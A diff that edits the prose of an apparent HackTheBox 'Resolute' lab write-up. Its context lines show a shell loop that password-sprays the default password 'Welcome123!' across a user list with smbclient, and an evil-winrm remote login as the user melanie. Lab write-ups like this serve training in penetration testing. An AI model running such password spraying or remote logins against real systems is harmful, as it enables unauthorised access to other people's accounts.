@@ -356,7 +356,7 @@ simon
 naoki
 ```
 
-Then we can do a simple loop through all users and attempt to authenticate with the password `Welcome123!` by using `smbclient`:
+We can do a simple loop through all users and attempt to authenticate with the password `Welcome123!` by using `smbclient`:
 ```
 for i in $(cat users.txt);do echo "[+] $i" && smbclient -L resolute.htb -U $i%"Welcome123!";done
 ```
@@ -425,7 +425,7 @@ session setup failed: NT_STATUS_LOGON_FAILURE
 session setup failed: NT_STATUS_LOGON_FAILURE
 ```
 
-Awesome - our default password worked for `melanie`! Let's try using her account to login remotely via Windows Remote Management:
+Our default password worked for `melanie`! Let's try using her account to login remotely via Windows Remote Management:
 ```
 kali@kali:~$ evil-winrm -i resolute.htb -u melanie -p 'Welcome123!'
 
